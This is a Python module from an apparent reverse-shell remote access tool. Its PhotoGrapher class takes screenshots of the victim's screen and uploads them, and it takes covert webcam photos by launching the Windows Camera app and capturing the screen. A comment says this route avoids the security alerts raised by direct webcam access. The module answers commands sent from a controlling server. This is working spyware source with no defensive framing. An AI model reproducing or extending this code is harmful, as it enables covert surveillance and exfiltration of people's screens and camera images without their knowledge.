"""
This module handles all the Image related task for the reverse shell
"""

# 1st party imports
import subprocess
from io import BytesIO
from typing import List

# 3rd party imports
from mss import mss
from PIL import Image
from mss.screenshot import ScreenShot

# local imports
from commands import ShellCommands
from Utilities.ui_manager import UIManager
from Utilities.file_manager import FileManager

class PhotoGrapher:
    """
    This class handles all the Image related task for the reverse shell
    """

    def __init__(self):
        """
        Initialize the PhotoGrapher class
        """

        # initialize a FileManager
        self.file_manager = FileManager()

        # initialize a UiManager
        self.ui_manager = UIManager()

    def take_screenshot(self) -> ScreenShot:
        """
        Take a screenshot of the screen and return it as a base64 string

        Returns:
            Screenshot: The Screenshot object.
        """

        with mss() as sct:
            return sct.grab(sct.monitors[1])

    def get_screenshot_link(self) -> str:
        """
        Get the screenshot of the screen and return it as a base64 string

        Returns:
            str: The base64 string of the screenshot.
        """

        screenshot = self.take_screenshot()

        # Write to a BytesIO object instead of a file
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)

        # create a buffer
        buffer = BytesIO()

        # save the image to the buffer and get the bytes
        img.save(buffer, format="PNG")
        img_bytes = buffer.getvalue()

        # upload and return the link
        return self.file_manager._upload_bytes(img_bytes)

    def take_camera_photo(self) -> bytes:
        """
        Take a photo of the camera and return it as bytes

        Returns:
            bytes: The bytes of the photo.
        """
        # open the camera and take a screenshot
        # NOTE: Accessing the webcam directly raises suspicious activity alerts
        #       on some systems. Use a screen capture instead.

        # open the camera
        start_command = "powershell -Command start microsoft.windows.camera:"
        result = subprocess.call(start_command, shell=True)

        # if the camera is not opened, return an error
        if result != 0:
            return "Camera not opened"

        # focus on the camera window and take a screenshot
        self.ui_manager.focus_on_tab("Camera")

        # take the photo
        img_link = self.get_screenshot_link()

        # close the camera
        self.ui_manager.close_tab("Camera")

        return img_link

    def handle_command(self, command: List[str]) -> str:
        """
        Handle the command received from the server.

        Args:
            command (List[str]): The list of commands to handle with args.

        Returns:
            str: The output of the command.
        """

        if command[0] == ShellCommands.TAKE_SCREENSHOT.value:
            return self.get_screenshot_link()

        elif command[0] == ShellCommands.TAKE_PHOTO.value:
            return self.take_camera_photo()

        else:
            return "Invalid command for photographer. Provided command: `{}`".format(" ".join(command))
